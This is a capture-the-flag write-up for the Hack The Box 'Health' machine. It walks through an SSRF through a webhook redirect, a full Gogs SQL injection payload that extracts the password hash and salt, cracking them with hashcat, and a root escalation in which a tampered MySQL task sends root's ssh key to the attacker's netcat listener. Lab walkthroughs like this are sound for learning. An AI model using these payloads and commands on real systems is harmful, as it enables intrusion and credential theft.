**Target: 10.10.11.176 Health**

**Initial Access:**\
nmap -Pn 10.10.11.176 --min-rate=5000 -p-|grep open|awk -F '/' '{print $1}'|tr '\n' ',' \
Ouput shows open ports: 22,80.  And a filtered port 3000.

Enumerate these open ports further with nmap: \
nmap -Pn 10.10.11.176 --min-rate=5000 -p 22,80 -sC -sV -oN nmap.health 

![image](https://user-images.githubusercontent.com/93153300/200188788-0df73879-65c6-422a-8020-39b35633aa43.png)

Navigate to port 80. The page shows:

![image](https://user-images.githubusercontent.com/93153300/200188808-59ac4cc2-3031-44d0-afde-c967f997dc4f.png)

Put health.htb into /etc/hosts: 10.10.11.176 health.htb \
This page shows that we can create webhooks and test it.  The monitored URL means the url that we want to check on.  The payload URL is the url of the server that will receive the webhook post requests.  Meaning, the payload url will receive the information about the monitored url. 

We have access to port 80 already, so doing this monitor on port 80 is not so interesting.  However, nmap showed that port 3000 is filtered.  Try to get information on port 3000 with this webhook.  Input the following: \
Payload url: http://```<LHOST>```:4444  	 (open on our pc a netcat listener: nc -lvnp 4444) \
Monitored url: http://health.htb:3000 \
Interval: */1 * * * * \
Under what circumstances should the webhook be sent: Select the option of ‘Always’. 

Now that we have finished inputting the information click on test.  The site responds that it isn’t allowed to monitor http://health.htb:3000:

![image](https://user-images.githubusercontent.com/93153300/200188815-9e9f6848-079d-40d2-be80-9247090d8f11.png)

Try changing the monitored url input to 127.0.0.1:3000 instead of health.htb, but again it gets the same error.  

The server won’t let us get information on port 3000.   \
Test to see if we can input our ip address as the monitored url.  Open a python web server: python3 -m http.server 80.  Next, input the monitored url as our ip address instead of health.htb. Click on test, it works.  

Based on the above, it seems like port 3000 on the target cannot be monitored by external ip’s.  Therefore, let’s try server side request forgery.  We will put in the ‘monitored url’ field our ip address, but then set up on our python server a redirect to 127.0.0.1:3000.  Here are the steps for this plan of action: \
Step 1: Write a python redirect.py script: 

![image](https://user-images.githubusercontent.com/93153300/200188820-975ff803-82b9-453f-bbd4-18bcce792e2d.png)
 
With this redirect.py script, when we input on port 80 to monitor our url, it will reach out to our url but then redirect to monitor 127.0.0.1:3000.  
Step 2: Open a netcat listener to capture the data returned: nc -lvnp 4444. \
Run python redirect.py server: 

![image](https://user-images.githubusercontent.com/93153300/200188826-57b845b3-0632-4b5c-a493-3ea8773f90db.png)
 
Step 3: Input the following information on port 80 and then click on test:

![image](https://user-images.githubusercontent.com/93153300/200188834-e625f1ac-2d42-41d6-8fc4-949d691de140.png)

Step 4: The ssrf worked, our netcat listener received the source code on port 3000:

![image](https://user-images.githubusercontent.com/93153300/200188843-5c19dae2-30da-43b1-bd84-a629385cb203.png)

Reading through the source code we find that it mentions a number of times the ‘Gogs (Go Git Service)’.  Seems like the 127.0.0.1:3000 runs Gogs.  

Check for exploits on Gogs with command: searchsploit gogs → found exploits:

![image](https://user-images.githubusercontent.com/93153300/200188853-5b5f1274-e1a9-42bb-b30b-d4360680b757.png)
 
Download 35238.txt with command: searchsploit -m 35238.txt. \
After reading through the sqli exploit 35238.txt, and some trial and error, here is the working payload:\
http://127.0.0.1:3000/api/v1/users/search?q=')/**/union/**/all/**/select/**/1,1,(select/**/passwd/**/from/**/user),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1--

This exploit will not work if we run that payload in the url, as port 3000 is filtered.  We will perform this sqli through our server side request forgery.  Repeat the steps for ssrf like we did before.  The only difference here is that our redirect will go to the sqli.  It should look like this:

![image](https://user-images.githubusercontent.com/93153300/200188860-94a4bfe5-83a9-480d-878a-65ca71a7afe0.png)
  
![image](https://user-images.githubusercontent.com/93153300/200188870-917f493f-bfe3-4b46-96cc-af88fb9df27a.png)

Click on test and the sqli works:
 
![image](https://user-images.githubusercontent.com/93153300/200188969-f461d86c-bbae-46ec-81df-1da6ebd7b27e.png)

To make the netcat data capture easier to read: \
Step 1: copy the netcat data into a file, we will call it sqlidump \
Step 2: cat sqldump | jq

![image](https://user-images.githubusercontent.com/93153300/200188983-6b4e4771-1d4c-4aa3-ab9a-0b2079655c1b.png)

Found username ‘susanne’ and a hashed password ‘66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37’

Do the same sqli through ssrf to get the salt.  To do this, just change the sql injection from getting the password to getting the salt.  It should look like this: \
http://127.0.0.1:3000/api/v1/users/search?q=')/**/union/**/all/**/select/**/1,1,(select/**/salt/**/from/**/user),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1--

Found the salt: sO3XIbeW14

Command to put salt and hash in a format that hashcat can crack: \
echo 'sha256:10000:'$(echo 'sO3XIbeW14' | base64 | cut -c1-14)':'$(echo '66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37' | xxd -r -p | base64) >hash

hashcat hash -m 10900 /usr/share/wordlists/rockyou.txt
cracked: february15

ssh susanne@health.htb → when prompted for the password enter the password.
Got shell as susanne, can get the flag at /home/susanne/user.txt
_________________________________________________________________
**Privilege Escalation:**\
(*my ip address was 10.10.14.126, at this point it changed to 10.10.14.4)

Upload pspy to the target.  Change the pspy permission to have executable permissions with command: chmod +x pspy.  Running pspy we find:

![image](https://user-images.githubusercontent.com/93153300/200188995-619f072b-8d70-4feb-a667-7b7dfd4b9921.png)

Pspy shows that there is a background job that runs the ‘tasks’ in the mysql laravel database as root.  If we can change the values in ‘tasks’ then we can use that to escalate to root. 

We need to check 3 things to see if we can use this background job to escalate to root.  \
Step 1: Mysql credentials to log in.\
Step 2: Need privileges on mysql to update/change values in the table tasks.\
Step 3: Need to figure out how to create a task.

**Step 1 check:**\
File /var/www/html/.env contains credentials:

![image](https://user-images.githubusercontent.com/93153300/200189008-78c4e9a7-1d17-4954-9ed4-e38122fb7662.png)

Log into mysql with command: \
mysql -u laravel -p     → when prompts for password then enter MYsql_strongestpass@2014+ 

**Step 2 check:**\
Check if we have privileges to create/update column values with command: show grants;

![image](https://user-images.githubusercontent.com/93153300/200189018-758297c0-2818-4c17-93e2-8740776ecdc6.png)

This shows that we do have privileges to update column values in mysql.  

**Step 3 check:**\
Find the ‘tasks’ table.   \
Check databases in mysql with command: show databases;

![image](https://user-images.githubusercontent.com/93153300/200189022-07909692-17a4-4f54-a41d-755744326c77.png)

Choose laravel database with command: use laravel;\
Check what tables are in laravel with command: show tables;

![image](https://user-images.githubusercontent.com/93153300/200189027-3f433223-1f23-4f0f-b8b9-c8f4f0db2b61.png)

Check the columns in the table ‘tasks’ with command: describe tasks;

![image](https://user-images.githubusercontent.com/93153300/200189032-d27baa33-91ef-4b2d-be12-6609bf3cbe61.png)
 
Now that we found the table ‘tasks’, let’s check how we can create a task. Pspy seemed to indicate that port 80 creates tasks.  Let’s test this out.  Before doing anyhting, checking on the tasks databases values shows as empty:

![image](https://user-images.githubusercontent.com/93153300/200189043-2d06d924-7761-45a5-ab1e-6a7dd0eca994.png)
Create a webhook on port 80 like we did previously (monitored and payload url put our ip address):  

![image](https://user-images.githubusercontent.com/93153300/200189049-32e96e00-8e3c-4c17-84a8-0de765ee45bf.png)
  
This time, do not click on test, rather click on create.  After clicking create on port 80, check on the task’s value in mysql: 

![image](https://user-images.githubusercontent.com/93153300/200189053-b4b16d28-f4cf-4575-903c-edd9edbf979e.png)
This clearly shows that creating a webhook on port 80 creates a task in the mysql laravel database.  

Now that we have checked off all 3 steps, we are ready to use this to escalate to root.  \
Steps for privilege escalation:\
Step 1: Open a netcat listener: nc -lvnp 80. \
Step 2: On port 80, create a webhook to output the ‘monitoredUrl’ data to us on our netcat listener:

![image](https://user-images.githubusercontent.com/93153300/200189846-52ee5a8f-37d0-44aa-b837-f7b1bfb3c542.png)

Step 3: In the laravel database in mysql, update the column ‘monitoredUrl’ to root’s private ssh key with command: update tasks set monitoredUrl=’file:///root/.ssh/id_rsa’; \
Step 4: Our netcat listener will get root’s ssh private key, then we can ssh into root with that key. 

![image](https://user-images.githubusercontent.com/93153300/200189063-f44200e8-07ef-48ae-91d0-346e9e3a8bc2.png)
  
To make the private key work for ssh login do the following: \
Step 1: Create a file (we will call it id_rsa) and paste the private key into the file.\
Step 2: Change file permissions with command:  chmod 600 id_rsa \
Step 3: Replace all ‘\n’ with an actual new line.  \
Step 4: Remove the remaining backslashes with command: cat id_rsa | tr -d ‘\’ > id_rsaroot

Log into root with command: ssh -i id_rsaroot root@health.htb   \
We have shell as root, we can get the flag at /root/root.txt
